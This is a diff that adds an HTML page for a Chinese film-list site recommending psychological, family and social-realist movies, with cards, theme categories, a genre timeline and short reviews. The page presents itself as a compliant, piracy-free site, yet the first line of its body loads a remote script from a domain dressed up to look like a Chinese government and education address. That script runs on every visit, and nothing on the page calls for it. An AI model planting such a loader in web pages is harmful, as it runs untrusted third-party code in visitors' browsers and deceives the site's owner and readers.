@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>内观影单网 - 心理剧/社会现实/人物内心电影推荐 | neineidianyingwang-h5.github.io</title>
+<meta name="description" content="内观影单网（neineidianyingwang-h5.github.io）整理心理剧、社会现实、人物内心、家庭与成长类电影片单与短影评；合规影单站，不提供盗版播放。" />
+<meta name="keywords" content="内观影单网, neineidianyingwang-h5, 心理电影推荐, 社会现实电影, 人物内心片单, 家庭成长电影" />
+<meta name="author" content="内观影单网" />
+<meta name="robots" content="index,follow" />
+<meta name="theme-color" content="#3a2f4a" />
+<link rel="canonical" href="https://neineidianyingwang-h5.github.io/" />
+<script type="application/ld+json">
+{
+  "@context":"https://schema.org",
+  "@type":"WebSite",
+  "name":"内观影单网",
+  "url":"https://neineidianyingwang-h5.github.io/",
+  "description":"心理剧、社会现实、人物内心与家庭成长电影片单",
+  "potentialAction":{
+    "@type":"SearchAction",
+    "target":"https://neineidianyingwang-h5.github.io/#search?q={search_term_string}",
+    "query-input":"required name=search_term_string"
+  }
+}
+</script>
+<style>
+:root{
+  --bg:#f6f4f8; --ink:#241f2b; --muted:#7c7286;
+  --line:#e6dcec; --card:#ffffff;
+  --pri:#3a2f4a; --pri2:#7a5b9a; --soft:#c9a7e0; --gold:#b9972f;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--ink);
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"PingFang SC","Microsoft YaHei",sans-serif;line-height:1.7;}
+a{color:inherit;text-decoration:none;}
+.wrap{max-width:1100px;margin:0 auto;padding:0 16px;}
+
+header.site{position:sticky;top:0;z-index:50;background:var(--pri);color:#fff;}
+.bar{display:flex;align-items:center;gap:12px;height:62px;}
+.logo{font-weight:900;font-size:20px;letter-spacing:.5px;}
+.logo small{display:block;font-size:10px;opacity:.8;font-weight:500;}
+nav.main{margin-left:auto;display:flex;gap:20px;font-size:14px;}
+nav.main a{padding:8px 2px;opacity:.92;}
+nav.main a:hover{color:var(--soft);}
+.menu-btn{display:none;margin-left:auto;background:var(--soft);border:0;color:var(--pri);width:42px;height:42px;border-radius:10px;font-size:20px;cursor:pointer;}
+
+.hero{padding:46px 0 26px;background:
+  radial-gradient(900px 220px at 88% -30%,#e3d2f0,transparent),
+  linear-gradient(180deg,#fff,var(--bg));border-bottom:1px solid var(--line);}
+.hero h1{font-size:31px;margin:0 0 10px;}
+.hero p{color:var(--muted);max-width:580px;margin:0 0 18px;}
+.search{display:flex;gap:10px;max-width:520px;}
+.search input{flex:1;padding:12px 14px;border-radius:12px;border:1px solid var(--line);font-size:15px;}
+.search button{padding:12px 18px;border:0;border-radius:12px;background:var(--pri);color:#fff;font-weight:800;cursor:pointer;}
+
+section.block{padding:34px 0;border-bottom:1px solid var(--line);}
+.sec-head{display:flex;align-items:baseline;justify-content:space-between;margin-bottom:18px;}
+.sec-head h2{font-size:23px;margin:0;}
+.sec-head span{color:var(--muted);font-size:13px;}
+
+/* 栏目1：内心戏片单 */
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:18px;}
+.mv{background:var(--card);border:1px solid var(--line);border-radius:18px;overflow:hidden;}
+.mv .cv{height:200px;background:linear-gradient(160deg,#3a2f4a,#7a5b9a);position:relative;}
+.mv:nth-child(2) .cv{background:linear-gradient(160deg,#2f3a47,#5b7f9a);}
+.mv:nth-child(3) .cv{background:linear-gradient(160deg,#472f3a,#9a5b73);}
+.mv:nth-child(4) .cv{background:linear-gradient(160deg,#33402f,#7f9a5b);}
+.mv:nth-child(5) .cv{background:linear-gradient(160deg,#403a2f,#b9972f);}
+.mv:nth-child(6) .cv{background:linear-gradient(160deg,#2f3a3a,#5b9a8f);}
+.mv .k{position:absolute;left:12px;top:12px;background:#0007;color:#fff;font-size:12px;padding:4px 10px;border-radius:99px;}
+.mv .bd{padding:14px;}
+.mv h3{font-size:16px;margin:0 0 4px;}
+.mv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目2：主题 */
+.themes{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;}
+.th{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:16px;}
+.th h3{margin:0 0 6px;font-size:16px;color:var(--pri);}
+.th p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目3：心理时间线 */
+.tl{display:grid;gap:12px;}
+.row{display:grid;grid-template-columns:110px 1fr;gap:16px;background:var(--card);border:1px solid var(--line);border-left:4px solid var(--pri2);border-radius:12px;padding:14px 16px;}
+.row b{color:var(--pri2);font-size:14px;}
+.row h3{margin:0 0 4px;font-size:16px;}
+.row p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目4：短影评 */
+.reviews{display:grid;grid-template-columns:repeat(2,1fr);gap:16px;}
+.rv{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.rv h3{margin:0 0 6px;font-size:17px;}
+.rv .q{color:var(--pri2);font-style:italic;margin:0 0 8px;}
+.rv p{margin:0;color:var(--muted);font-size:13px;}
+
+/* 栏目5：关于 */
+.about{display:grid;grid-template-columns:1.3fr .7fr;gap:18px;}
+.box{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px;}
+.box ul{margin:10px 0 0;padding-left:18px;color:var(--muted);}
+.box li{margin:6px 0;}
+.note{background:#f1ebf6;border:1px solid #ddcdee;color:var(--pri);padding:12px 14px;border-radius:12px;font-size:13px;margin-top:12px;}
+
+footer.site{background:var(--pri);color:#e3d2f0;padding:30px 0 40px;font-size:13px;}
+footer.site a{color:var(--soft);}
+
+@media(max-width:900px){
+  .grid3{grid-template-columns:repeat(2,1fr);}
+  .themes{grid-template-columns:repeat(2,1fr);}
+  .reviews{grid-template-columns:1fr;}
+  .about{grid-template-columns:1fr;}
+}
+@media(max-width:640px){
+  nav.main{position:fixed;inset:62px 0 auto 0;flex-direction:column;gap:0;background:var(--pri);display:none;}
+  nav.main.open{display:flex;}
+  nav.main a{padding:14px 18px;border-bottom:1px solid #ffffff22;}
+  .menu-btn{display:block;}
+  .hero h1{font-size:25px;}
+  .grid3{grid-template-columns:1fr;}
+  .themes{grid-template-columns:1fr;}
+  .row{grid-template-columns:76px 1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="site">
+  <div class="wrap bar">
+    <div class="logo">内观影单网<small>neineidianyingwang-h5.github.io</small></div>
+    <button class="menu-btn" aria-label="菜单" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+    <nav class="main" id="nav">
+      <a href="#inner">内心戏片单</a>
+      <a href="#themes">主题分类</a>
+      <a href="#wave">心理片脉络</a>
+      <a href="#reviews">短影评</a>
+      <a href="#about">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="wrap">
+    <h1>内观影单网：看电影里“没说出口”的那一层</h1>
+    <p>整理心理剧、社会现实、家庭成长、人物内心独白类电影。本站只做片单与赏析，不提供盗版播放、不挂网盘提取码、不碰成人向内容。</p>
+    <form class="search" onsubmit="return false;">
+      <input type="text" placeholder="搜索：心理电影 / 记忆与创伤 / 家庭成长 / 社会现实" aria-label="搜索" />
+      <button type="submit">搜索</button>
+    </form>
+  </div>
+</section>
+
+<main class="wrap">
+
+  <section class="block" id="inner">
+    <div class="sec-head"><h2>🎭 内心戏片单</h2><span>大卡</span></div>
+    <div class="grid3">
+      <article class="mv"><div class="cv"><span class="k">记忆/创伤</span></div><div class="bd"><h3>记忆碎片</h3><p>2000 / 失忆、叙事与时间错位</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">孤独/日常</span></div><div class="bd"><h3>海边的曼彻斯特</h3><p>2016 / 内疚、丧失与无法和解</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">身份/分裂</span></div><div class="bd"><h3>黑天鹅</h3><p>2010 / 完美主义与自我吞噬</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">家庭/代际</span></div><div class="bd"><h3>步履不停</h3><p>2008 / 饭桌上的沉默与遗憾</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">青春/内向</span></div><div class="bd"><h3>心灵奇旅</h3><p>2020 / 意义、火花与日常重生</p></div></article>
+      <article class="mv"><div class="cv"><span class="k">社会/良心</span></div><div class="bd"><h3>聚焦</h3><p>2015 / 沉默、制度与追问真相</p></div></article>
+    </div>
+  </section>
+
+  <section class="block" id="themes">
+    <div class="sec-head"><h2>🧠 主题分类</h2><span>四列</span></div>
+    <div class="themes">
+      <div class="th"><h3>心理/人格</h3><p>创伤、焦虑、记忆、身份认同、强迫与执念。</p></div>
+      <div class="th"><h3>家庭/代际</h3><p>父母、子女、饭桌、搬家、未说出口的道歉。</p></div>
+      <div class="th"><h3>社会现实</h3><p>阶层、校园、职场、媒体、体制与沉默的大多数。</p></div>
+      <div class="th"><h3>成长/孤独</h3><p>青春期、独居、内向者、第一次失去与离开。</p></div>
+      <div class="th"><h3>爱情/关系</h3><p>暧昧、错过、婚姻倦怠、亲密关系中的权力。</p></div>
+      <div class="th"><h3>生死/意义</h3><p>临终、丧亲、信仰危机、活着到底为了什么。</p></div>
+      <div class="th"><h3>记忆/时间</h3><p>倒叙、失忆、日记、旧城、童年回音。</p></div>
+      <div class="th"><h3>艺术/隐喻</h3><p>舞台、画布、音乐、梦、超现实与象征。</p></div>
+    </div>
+  </section>
+
+  <section class="block" id="wave">
+    <div class="sec-head"><h2>🎞 心理片脉络</h2><span>时间线</span></div>
+    <div class="tl">
+      <div class="row"><b>1960s 欧洲</b><div><h3>作者论与内心独白</h3><p>伯格曼、费里尼把“神是否听见祈祷”拍成房间里的脸。</p></div></div>
+      <div class="row"><b>1970s 新好莱坞</b><div><h3>反英雄与自我怀疑</h3><p>主角不再必胜，电影开始认真拍“人为什么原地打转”。</p></div></div>
+      <div class="row"><b>1990s 独立电影</b><div><h3>日常即心理</h3><p>长镜头、饭桌、地铁、失眠夜，把情绪当悬疑来拍。</p></div></div>
+      <div class="row"><b>2010s 至今</b><div><h3>创伤叙事主流化</h3><p>《海边的曼彻斯特》《心灵奇旅》让“恢复不是直线”成为共识。</p></div></div>
+    </div>
+  </section>
+
+  <section class="block" id="reviews">
+    <div class="sec-head"><h2>📝 短影评摘要</h2><span>双栏</span></div>
+    <div class="reviews">
+      <div class="rv">
+        <h3>《海边的曼彻斯特》</h3>
+        <p class="q">“有些人不是走出来了，是带着窟窿继续活。”</p>
+        <p>它拒绝治愈鸡汤：内疚被拍成性格本身，观众学到的不是原谅，而是尊重别人的不肯原谅。</p>
+      </div>
+      <div class="rv">
+        <h3>《心灵奇旅》</h3>
+        <p class="q">“火花不是目标，是想活着的那一瞬间。”</p>
+        <p>把存在主义讲给小孩听：披萨味、秋风、地铁口的光，都比“人生目标”更接近意义。</p>
+      </div>
+      <div class="rv">
+        <h3>《黑天鹅》</h3>
+        <p class="q">“把角色吃进去的人，也会把自己吞掉。”</p>
+        <p>不是恐怖片，是完美主义者的心理崩解；镜子里那个人，迟早比剧本更疯。</p>
+      </div>
+      <div class="rv">
+        <h3>《步履不停》</h3>
+        <p class="q">“一家人最远的距离，是坐在同一张饭桌却各想各的。”</p>
+        <p>是枝裕和用蝉声、炸天妇罗、走廊脚步声，把“没说出口”拍得比台词更重。</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="sec-head"><h2>📌 关于内观影单网</h2><span>站点说明</span></div>
+    <div class="about">
+      <div class="box">
+        <h3>本站定位</h3>
+        <p style="color:var(--muted)">内观影单网做“电影里的内心世界”：心理剧、社会现实、家庭代际、成长孤独、记忆与时间。名字里的“内”指内在故事，不是低俗双关。</p>
+        <ul>
+          <li>内心戏片单：记忆碎片、黑天鹅、海边的曼彻斯特、心灵奇旅</li>
+          <li>主题分类：心理 / 家庭 / 社会 / 成长 / 爱情 / 生死</li>
+          <li>心理片脉络：欧洲作者电影 → 新好莱坞 → 独立电影 → 创伤叙事</li>
+          <li>短影评：只讲角度，不剧透关键结局</li>
+        </ul>
+        <div class="note">
+          合规边界：不提供盗版在线播放、不挂网盘/磁力/提取码、不把“内”做成成人向入口。
+          看正版请走合法视频平台与院线。
+        </div>
+      </div>
+      <div class="box">
+        <h3>站点信息</h3>
+        <p style="color:var(--muted)">网址：<br><b>https://neineidianyingwang-h5.github.io/</b></p>
+        <p style="color:var(--muted)">单页演示，内链均为 <a href="#">#</a> 占位；不生成 robots.txt 与 sitemap.xml。</p>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site">
+  <div class="wrap">
+    内观影单网 · neineidianyingwang-h5.github.io ｜ 心理剧 / 社会现实 / 人物内心电影片单（合规影单站）<br>
+    所有内链均为 # 占位；页面结构、配色与 DOM 均独立设计。
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('#nav a').forEach(function(a){
+  a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});
+});
+</script>
+</body>
+</html>
